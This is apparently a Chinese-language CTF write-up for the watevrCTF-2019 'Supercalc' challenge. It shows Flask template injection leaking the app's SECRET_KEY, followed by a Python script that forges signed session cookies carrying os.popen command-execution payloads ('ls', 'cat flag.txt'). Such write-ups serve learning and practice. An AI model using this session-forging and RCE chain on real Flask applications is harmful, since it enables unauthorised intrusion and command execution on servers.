### [watevrCTF-2019]Supercalc

> session

#python #ctf #rce
----

<img src="https://gitee.com/bx33661/image/raw/master/path/image-20241012173028599.png" style="zoom:50%;" />



挺好看的一个界面，只有一个输入框，看了一下是python的web应用,并且还在cookie中发现session类型

```python
import base64
import json

def decode_session(session_data):
    try:
        # 分割session数据
        parts = session_data.split('.')
        if len(parts) != 3:
            raise ValueError("Session data should have three parts separated by dots.")

        # 尝试Base64解码第一个部分
        decoded_data = base64.urlsafe_b64decode(parts[0])
        print("Base64 Decoded Data:", decoded_data)

        # 尝试解析JSON
        json_data = json.loads(decoded_data.decode('utf-8'))
        print("Parsed JSON Data:", json_data)
    except Exception as e:
        print("Error decoding or parsing session data:", e)

# 示例session数据
session_data = "eyJoaXN0b3J5IjpbeyJjb2RlIjoiMSArIDEifV19.X98yeg.YggVMibcD6Bh8ZqORv4BMRBfNS0"

# 解码session数据
decode_session(session_data)

"""
Base64 Decoded Data: b'{"history":[{"code":"1 + 1"}]}'
Parsed JSON Data: {'history': [{'code': '1 + 1'}]}
"""
```

我们接下来就有思路了，寻找密钥构造

![image-20241012172851084](https://gitee.com/bx33661/image/raw/master/path/image-20241012172851084.png)

尝试报错发现flask-debug，

<img src="https://gitee.com/bx33661/image/raw/master/path/image-20241012173454124.png" alt="image-20241012173454124" style="zoom:80%;" />

尝试`{{7*7}}`，但是页面报错，所以我们尝试构造`1+2#{{7*7}}`,成功了

![image-20241012173708520](https://gitee.com/bx33661/image/raw/master/path/image-20241012173708520.png)

但是我们接着尝试其他操作的时候报错了，应该是存在过滤，我们尝试访问{{config}}

![image-20241012173853552](https://gitee.com/bx33661/image/raw/master/path/image-20241012173853552.png)

这个被实体编码了，我们尝试解码，这里我才用python脚本：

```python
import html

def decode_html_entities(encoded_string):
    return html.unescape(encoded_string)

encoded_string = " {&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: False, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;cded826a1e89925035cc05f0907855f7&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;/&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(0, 43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application/json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093}&gt;"
decoded_string = decode_html_entities(encoded_string)

print("Encoded String:", encoded_string)
print("---------------------------------------------------------------------------------")
print("Decoded String:", decoded_string)
```



解码之后：

```python
{'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': 'cded826a1e89925035cc05f0907855f7', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>
```

我们发现密钥：`cded826a1e89925035cc05f0907855f7`,接着我们就可以构造session了

这里采用flask-session那个脚本,还可以用下面这个简单点的:

```python
from flask.sessions import SecureCookieSessionInterface
secret_key = "cded826a1e89925035cc05f0907855f7"
class FakeApp:
    secret_key = secret_key


fake_app = FakeApp()
session_interface = SecureCookieSessionInterface()
serializer = session_interface.get_signing_serializer(fake_app)
payload = serializer.dumps(
    {"history": [{"code": '__import__("os").popen("ls ").read()'}]}
)
print(payload)
```

Payload:

![image-20241012175748887](https://gitee.com/bx33661/image/raw/master/path/image-20241012175748887.png)

```python
# {"history": [{"code": '__import__("os").popen("ls ").read()'}]}
eyJoaXN0b3J5IjpbeyJjb2RlIjoiX19pbXBvcnRfXyhcIm9zXCIpLnBvcGVuKFwibHMgXCIpLnJlYWQoKSJ9XX0

#发现flag.txt
#{"history": [{"code": '__import__("os").popen("cat flag.txt").read()'}]}
eyJoaXN0b3J5IjpbeyJjb2RlIjoiX19pbXBvcnRfXyhcIm9zXCIpLnBvcGVuKFwiY2F0IGZsYWcudHh0XCIpLnJlYWQoKSJ9XX0.ZwpHng.iAZ3QSGmOtC826N897VmB-LeHOA
```

![image-20241012175606493](https://gitee.com/bx33661/image/raw/master/path/image-20241012175606493.png)